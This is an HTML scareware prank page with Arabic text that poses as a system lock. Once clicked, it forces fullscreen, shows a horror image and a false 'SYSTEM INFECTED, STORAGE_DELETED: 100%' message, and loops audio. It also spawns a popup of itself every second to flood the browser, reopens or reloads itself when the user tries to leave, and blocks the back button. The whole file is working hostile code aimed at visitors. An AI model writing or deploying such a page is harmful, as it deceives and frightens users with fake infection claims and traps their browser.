<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_CRITICAL_LOCK ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
        #messageBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.85); padding: 30px; border: 5px solid #f00; display: none; width: 85%; box-shadow: 0 0 25px #f00; }
        .blink { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onclick="activateVirus()">

    <div id="messageBox" class="blink">
        <h1 style="font-size: 30px;">⚠️ SYSTEM INFECTED ⚠️</h1>
        <p style="font-size: 18px;">نظامك مات سواسوة.. الضحك خلاص درك!</p>
        <hr style="border: 1px solid #f00;">
        <p style="font-size: 13px; color: #fff;">STORAGE_DELETED: 100%<br>LOCKED_BY_ALGE-HACKER</p>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>

    <script>
        let running = false;
        const audio = document.getElementById('sfx');
        const msg = document.getElementById('messageBox');
        const img = document.getElementById('horrorImg');
        const MY_LINK = window.location.href;

        // ميزة تكرار الصوت مع سكتة 4 ثواني سواسوة
        audio.addEventListener('ended', function() {
            setTimeout(() => {
                if(running) audio.play();
            }, 4000); 
        });

        function activateVirus() {
            if (running) return;
            running = true;
            document.documentElement.requestFullscreen().catch(() => {});
            
            audio.volume = 1.0; 
            audio.play();
            img.style.display = 'block';
            msg.style.display = 'block';

            // إغراق النظام بالتبويبات سواسوة
            setInterval(() => {
                window.open(MY_LINK, '_blank', 'width=10,height=10');
            }, 1000);
        }

        // إجبار الدخول والتحكم في قوقل سواسوة
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'visible' && running) {
                location.reload();
                alert("⚠️ وين راك هارب؟ النظام تفيروسا سواسوة!");
            }
        });

        window.onblur = function() {
            if(running) {
                setTimeout(() => {
                    window.open(MY_LINK, '_self');
                }, 400);
            }
        };

        // منع الرجوع سواسوة
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);
        window.onbeforeunload = () => "⚠️ راك محبوس سواسوة!";
    </script>
</body>
</html>
